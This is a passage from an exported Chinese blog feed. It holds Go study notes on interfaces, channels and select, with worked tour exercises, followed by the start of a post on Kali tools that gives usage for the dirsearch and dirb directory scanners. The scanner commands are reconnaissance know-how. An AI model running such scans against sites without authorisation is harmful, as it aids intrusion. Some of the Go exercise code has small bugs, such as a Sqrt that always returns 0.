一个接口值是否保存了一个特定的类型，类型断言可返回两个值：其底层值以及一个报告断言是否成功的布尔值。</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-built_in">t</span>, ok <span class="hljs-symbol">:</span>= i.(<span class="hljs-built_in">T</span>)<br></code></pre></td></tr></table></figure><p>若 <code>i</code> 保存了一个 <code>T</code>，那么 <code>t</code> 将会是其底层值，而 <code>ok</code> 为 <code>true</code>；否则，<code>ok</code> 将为 <code>false</code> 而 <code>t</code> 将为 <code>T</code> 类型的零值，程序并不会产生恐慌。</p><h3 id="接口类型查询"><a href="#接口类型查询" class="headerlink" title="接口类型查询"></a>接口类型查询</h3><p>​接口类型查询用于查询一个接口变量底层的具体类型是什么，或者该接口变量是否实现了其他接口。类型选择中的声明与类型断言 <code>i.(T)</code> 的语法相同，只是具体类型 <code>T</code> 被替换成了关键字 <code>type</code>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">switch</span> v := i.(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-keyword">case</span> T:<br>    <span class="hljs-comment">// v 的类型为 T</span><br><span class="hljs-keyword">case</span> S:<br>    <span class="hljs-comment">// v 的类型为 S</span><br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-comment">// 没有匹配，v 与 i 的类型相同</span><br>&#125;<br></code></pre></td></tr></table></figure><p>此选择语句判断接口值 <code>i</code> 保存的值类型是 <code>T</code> 还是 <code>S</code>。在 <code>T</code> 或 <code>S</code> 的情况下，变量 <code>v</code> 会分别按 <code>T</code> 或 <code>S</code> 类型保存 <code>i</code> 拥有的值。在默认（即没有匹配）的情况下，变量 <code>v</code> 与 <code>i</code> 的接口类型和值相同。</p><h3 id="Stringer接口"><a href="#Stringer接口" class="headerlink" title="Stringer接口"></a>Stringer接口</h3><p><a href="https://go-zh.org/pkg/fmt/"><code>fmt</code></a> 包中定义的 <a href="https://go-zh.org/pkg/fmt/#Stringer"><code>Stringer</code></a> 是最普遍的接口之一。</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-keyword">type</span> <span class="hljs-type">Stringer</span> interface &#123;<br>    <span class="hljs-type">String</span>() string<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Stringer</code> 是一个可以用字符串描述自己的类型。<code>fmt</code> 包（还有很多包）都通过此接口来打印值（感觉像是php中的_toString()_方法(っ °Д °;)っ）。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>Name <span class="hljs-type">string</span><br>Age  <span class="hljs-type">int</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p Person)</span></span> String() <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> fmt.Sprintf(<span class="hljs-string">&quot;%v (%v years)&quot;</span>, p.Name, p.Age)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := Person&#123;<span class="hljs-string">&quot;Arthur Dent&quot;</span>, <span class="hljs-number">42</span>&#125;<br>z := Person&#123;<span class="hljs-string">&quot;Zaphod Beeblebrox&quot;</span>, <span class="hljs-number">9001</span>&#125;<br>fmt.Println(a, z)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="error接口"><a href="#error接口" class="headerlink" title="error接口"></a>error接口</h3><p>Go 程序使用 <code>error</code> 值来表示错误状态。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">type <span class="hljs-built_in">error</span><span class="hljs-built_in"> interface </span>&#123;<br>    <span class="hljs-built_in">Error</span>() string<br>&#125;<br></code></pre></td></tr></table></figure><p>通常函数会返回一个 <code>error</code> 值，调用的它的代码应当判断这个错误是否等于 <code>nil</code> 来进行错误处理。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> ErrNegativeSqrt <span class="hljs-type">float64</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(e ErrNegativeSqrt)</span></span> Error() <span class="hljs-type">string</span>&#123;<br><span class="hljs-keyword">return</span> fmt.Sprint(<span class="hljs-string">&quot;cannot Sqrt negative number: %v&quot;</span>,<span class="hljs-type">float64</span>(e))<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Sqrt</span><span class="hljs-params">(x <span class="hljs-type">float64</span>)</span></span> (<span class="hljs-type">float64</span>, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">if</span> x&lt;=<span class="hljs-number">0</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, ErrNegativeSqrt(x)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(Sqrt(<span class="hljs-number">2</span>))<br>fmt.Println(Sqrt(<span class="hljs-number">-2</span>))<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="go语言并发"><a href="#go语言并发" class="headerlink" title="go语言并发"></a>go语言并发</h3><p><strong>信道</strong></p><p>信道是带有类型的管道，使用<code>&lt;-</code>来发送和接受数据。</p><p><code>Channel</code>类型定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">chan</span> T          <span class="hljs-comment">// 可以接收和发送类型为 T 的数据</span><br><span class="hljs-keyword">chan</span>&lt;- <span class="hljs-type">int</span> <span class="hljs-comment">//只可以用来发送int数据</span><br>&lt;-<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span> <span class="hljs-comment">//只可以用来接受int数据</span><br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)  <span class="hljs-comment">// 创建int类型信道ch,默认是双向信道</span><br>ch &lt;- v    <span class="hljs-comment">// 将 v 发送至信道 ch。</span><br>v := &lt;-ch  <span class="hljs-comment">// 从 ch 接收值并赋予 v。</span><br></code></pre></td></tr></table></figure><blockquote><p>  默认情况下，发送和接收操作在另一端准备好之前都会阻塞。这使得 Go 程可以在没有显式的锁或竞态变量的情况下进行同步。</p></blockquote><p>信道也可以设置缓冲区，在这种情况下，仅当缓冲区填满后，发送方才会阻塞；仅当缓冲区为空时，接收方才会阻塞。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> in,<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>信道默认情况下不需要显示的进行关闭但是在某些情况下可能需要表示数据传输完成，可以使用<code>close(ch)</code>关闭指定信道，此时，下列<code>ok</code>属性会被职位<code>false</code>，代表信道关闭，不能继续传入数据。循环 <code>for i := range ch</code> 会不断从信道接收值，直到它被关闭。</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-built_in">v,</span> ok := &lt;-ch<br></code></pre></td></tr></table></figure><h3 id="select语句"><a href="#select语句" class="headerlink" title="select语句"></a>select语句</h3><p><code>select</code> 语句使一个 Go 程可以等待多个通信操作。</p><p><code>select</code> 会阻塞到某个分支可以继续执行为止，这时就会执行该分支。当多个分支都准备好时会随机选择一个执行。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">fibonacci</span><span class="hljs-params">(c, quit <span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)</span></span> &#123;<br>x, y := <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> &#123;<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> c &lt;- x:<br>x, y = y, x+y<br><span class="hljs-keyword">case</span> &lt;-quit:<br>fmt.Println(<span class="hljs-string">&quot;quit&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>c := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)<br>quit := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++ &#123;<br>fmt.Println(&lt;-c)<br>&#125;<br>quit &lt;- <span class="hljs-number">0</span><br>&#125;()<br>fibonacci(c, quit)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>默认情况下，主函数读取信道c，<code>case c&lt;-x</code>分支即可继续，<code>case &lt;-quit</code>一直阻塞；当执行到<code>quit &lt;- 0</code>，信道c阻塞，信道<code>quit</code>存入数据，<code>case c&lt;-x</code>分支阻塞，<code>case &lt;-quit</code>执行继续。</p><blockquote><p>  select中也存在默认分支，当其他分支都没有准备好时，<code>default</code>分支就会执行。</p></blockquote><h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><p><strong>判断等价二叉查找树</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-string">&quot;golang.org/x/tour/tree&quot;</span><br>)<br><br><span class="hljs-comment">// Walk 步进 tree t 将所有的值从 tree 发送到 channel ch。</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Walk</span><span class="hljs-params">(t *tree.Tree, ch <span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)</span></span> &#123;<br><span class="hljs-keyword">if</span> t == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>Walk(t.Left, ch)<br>Walk(t.Right, ch)<br>ch &lt;- t.Value<br>&#125;<br><br><span class="hljs-comment">// Same 检测树 t1 和 t2 是否含有相同的值。</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Same</span><span class="hljs-params">(t1, t2 *tree.Tree)</span></span> <span class="hljs-type">bool</span> &#123;<br>ch1 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)<br>ch2 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)<br><span class="hljs-keyword">go</span> Walk(t1, ch1)<br><span class="hljs-keyword">go</span> Walk(t2, ch2)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++ &#123;<br><span class="hljs-keyword">if</span> &lt;-ch1 != &lt;-ch2 &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)<br><span class="hljs-keyword">go</span> Walk(tree.New(<span class="hljs-number">1</span>), ch)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++ &#123;<br>fmt.Println(&lt;-ch)<br>&#125;<br>t1:=tree.New(<span class="hljs-number">1</span>)<br>t2:=tree.New(<span class="hljs-number">2</span>)<br>fmt.Println(Same(t1, t1))<br>fmt.Println(Same(t1, t2))<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>web并发爬虫</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;sync&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> Fetcher <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-comment">// Fetch 返回 URL 的 body 内容，并且将在这个页面上找到的 URL 放到一个 slice 中。</span><br>Fetch(url <span class="hljs-type">string</span>) (body <span class="hljs-type">string</span>, urls []<span class="hljs-type">string</span>, err <span class="hljs-type">error</span>)<br>&#125;<br><br><span class="hljs-keyword">type</span> SaveUrl <span class="hljs-keyword">struct</span> &#123;<br>url   <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>] <span class="hljs-type">int</span><br>mux  sync.Mutex<br>&#125;<br><br><span class="hljs-keyword">var</span> saveurls = SaveUrl&#123;url: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>] <span class="hljs-type">int</span>)&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s * SaveUrl)</span></span>insert(url <span class="hljs-type">string</span>) <span class="hljs-type">bool</span>&#123;<br>s.mux.Lock()<br><span class="hljs-keyword">defer</span> s.mux.Unlock()<br>_,ok := s.url[url]<br><span class="hljs-keyword">if</span> ok&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>s.url[url]++<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><br><span class="hljs-comment">// Crawl 使用 fetcher 从某个 URL 开始递归的爬取页面，直到达到最大深度。</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Crawl</span><span class="hljs-params">(url <span class="hljs-type">string</span>, depth <span class="hljs-type">int</span>, fetcher Fetcher,end <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>)</span></span> &#123;<br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> 并行的抓取 URL。</span><br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> 不重复抓取页面。</span><br>        <span class="hljs-comment">// 下面并没有实现上面两种情况：</span><br><span class="hljs-keyword">if</span> depth &lt;= <span class="hljs-number">0</span> &#123;<br>end &lt;- <span class="hljs-literal">true</span><br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> saveurls.insert(url) == <span class="hljs-literal">false</span>&#123;<br>end &lt;- <span class="hljs-literal">true</span><br><span class="hljs-keyword">return</span><br>&#125;<br>body, urls, err := fetcher.Fetch(url)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(err)<br>end &lt;- <span class="hljs-literal">true</span><br><span class="hljs-keyword">return</span><br>&#125;<br><br>fmt.Printf(<span class="hljs-string">&quot;found: %s %q\n&quot;</span>, url, body)<br><br>ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>)<br><span class="hljs-keyword">for</span> _, u := <span class="hljs-keyword">range</span> urls &#123;<br><span class="hljs-keyword">go</span> Crawl(u, depth<span class="hljs-number">-1</span>, fetcher,ch)<br>&#125;<br><span class="hljs-keyword">for</span> i :=<span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">len</span>(urls);i++&#123;<br>&lt;-ch<br>&#125;<br>end &lt;- <span class="hljs-literal">true</span><br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>end := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>)<br><span class="hljs-keyword">go</span> Crawl(<span class="hljs-string">&quot;https://golang.org/&quot;</span>, <span class="hljs-number">4</span>, fetcher, end)<br>&lt;-end<br>&#125;<br><br><span class="hljs-comment">// fakeFetcher 是返回若干结果的 Fetcher。</span><br><span class="hljs-keyword">type</span> fakeFetcher <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]*fakeResult<br><br><span class="hljs-keyword">type</span> fakeResult <span class="hljs-keyword">struct</span> &#123;<br>body <span class="hljs-type">string</span><br>urls []<span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(f fakeFetcher)</span></span> Fetch(url <span class="hljs-type">string</span>) (<span class="hljs-type">string</span>, []<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">if</span> res, ok := f[url]; ok &#123;<br><span class="hljs-keyword">return</span> res.body, res.urls, <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;not found: %s&quot;</span>, url)<br>&#125;<br><br><span class="hljs-comment">// fetcher 是填充后的 fakeFetcher。</span><br><span class="hljs-keyword">var</span> fetcher = fakeFetcher&#123;<br><span class="hljs-string">&quot;https://golang.org/&quot;</span>: &amp;fakeResult&#123;<br><span class="hljs-string">&quot;The Go Programming Language&quot;</span>,<br>[]<span class="hljs-type">string</span>&#123;<br><span class="hljs-string">&quot;https://golang.org/pkg/&quot;</span>,<br><span class="hljs-string">&quot;https://golang.org/cmd/&quot;</span>,<br>&#125;,<br>&#125;,<br><span class="hljs-string">&quot;https://golang.org/pkg/&quot;</span>: &amp;fakeResult&#123;<br><span class="hljs-string">&quot;Packages&quot;</span>,<br>[]<span class="hljs-type">string</span>&#123;<br><span class="hljs-string">&quot;https://golang.org/&quot;</span>,<br><span class="hljs-string">&quot;https://golang.org/cmd/&quot;</span>,<br><span class="hljs-string">&quot;https://golang.org/pkg/fmt/&quot;</span>,<br><span class="hljs-string">&quot;https://golang.org/pkg/os/&quot;</span>,<br>&#125;,<br>&#125;,<br><span class="hljs-string">&quot;https://golang.org/pkg/fmt/&quot;</span>: &amp;fakeResult&#123;<br><span class="hljs-string">&quot;Package fmt&quot;</span>,<br>[]<span class="hljs-type">string</span>&#123;<br><span class="hljs-string">&quot;https://golang.org/&quot;</span>,<br><span class="hljs-string">&quot;https://golang.org/pkg/&quot;</span>,<br>&#125;,<br>&#125;,<br><span class="hljs-string">&quot;https://golang.org/pkg/os/&quot;</span>: &amp;fakeResult&#123;<br><span class="hljs-string">&quot;Package os&quot;</span>,<br>[]<span class="hljs-type">string</span>&#123;<br><span class="hljs-string">&quot;https://golang.org/&quot;</span>,<br><span class="hljs-string">&quot;https://golang.org/pkg/&quot;</span>,<br>&#125;,<br>&#125;,<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Go并发"><a href="#Go并发" class="headerlink" title="Go并发"></a>Go并发</h2><h3 id="GOMAXPROCS"><a href="#GOMAXPROCS" class="headerlink" title="GOMAXPROCS"></a>GOMAXPROCS</h3><p><code>GOMAXPROCS</code> 是 Golang 提供的非常重要的一个环境变量设定。通过设定 <code>GOMAXPROCS</code>，用户可以调整 Runtime Scheduler 中 Processor（简称P）的数量。<code>Processor </code>是类似于 CPU 核心的概念，其用来控制并发的 M 数量。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 查看当前GOMAXPROCS数量</span><br>fmt.Println(runtime.GOMAXPROCS(<span class="hljs-number">0</span>))<br><span class="hljs-comment">// 设置GOMAXPROCS数量为CPU核心数</span><br>runtime.GOMAXPROCS(runtime.NumCPU())<br></code></pre></td></tr></table></figure><h3 id="func-Goexit"><a href="#func-Goexit" class="headerlink" title="func Goexit"></a>func Goexit</h3><p>​<code>func Goexit</code>用于结束当前<code>goroutime</code>的运行， <code>Go exit</code> 在结束当前 <code>goroutine </code>运行之前会调用当前 <code>goroutine</code> 已经注册的 <code>defer</code> ，<code>Goexit </code>并不会产生 <code>panic </code>，所以该 <code>goroutine defer</code> 里面的<code> recover</code> 调用都返回 <code>ni</code>。</p><h3 id="func-Gosched"><a href="#func-Gosched" class="headerlink" title="func Gosched"></a>func Gosched</h3><p>​<code>func Gosched</code>是放弃当前调度执行机会，将当前 <code>goroutine</code> 放到队列中等待下次被调度。</p>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
      <category>Golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kali工具用法介绍（更新中）</title>
    <link href="/2022/01/08/Tools/Kali%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D/"/>
    <url>/2022/01/08/Tools/Kali%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h1 id="kali工具用法介绍"><a href="#kali工具用法介绍" class="headerlink" title="kali工具用法介绍"></a>kali工具用法介绍</h1><h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、dirsearch"><a href="#1、dirsearch" class="headerlink" title="1、dirsearch"></a>1、dirsearch</h3><p><strong>功能：目录扫描</strong></p><p><strong>安装：</strong></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://github.com/maurosoria/dirsearch.git<br></code></pre></td></tr></table></figure><p><strong>用法：</strong></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-u 指定网址</span><br><span class="hljs-deletion">-e 指定网址语言</span><br><span class="hljs-deletion">-w 指定字典</span><br><span class="hljs-deletion">-r 递归目录(跑出目录后,继续跑下面的目录)</span><br><span class="hljs-deletion">--random-agents 使用随机UA</span><br></code></pre></td></tr></table></figure><p>eg:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python dirsearch.py -u 网址 -e php<br></code></pre></td></tr></table></figure><h3 id="2、dirb"><a href="#2、dirb" class="headerlink" title="2、dirb"></a>2、dirb</h3><p>功能：扫描目录</p><p>用法：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs diff">格式：dirb &lt;url_base&gt; [&lt;wordlist_file(s)&gt;] [options]<br><span class="hljs-deletion">-a 设置user-agent</span><br><span class="hljs-deletion">-p &lt;proxy[:port]&gt;设置代理</span><br><span class="hljs-deletion">-c 设置cookie</span><br><span class="hljs-deletion">-z 添加毫秒延迟，避免洪水攻击</span><br><span class="hljs-deletion">-o 输出结果</span><br><span class="hljs-deletion">-X 在每个字典的后面添加一个后缀</span><br><span class="hljs-deletion">-H 添加请求头</span><br><span class="hljs-deletion">-i 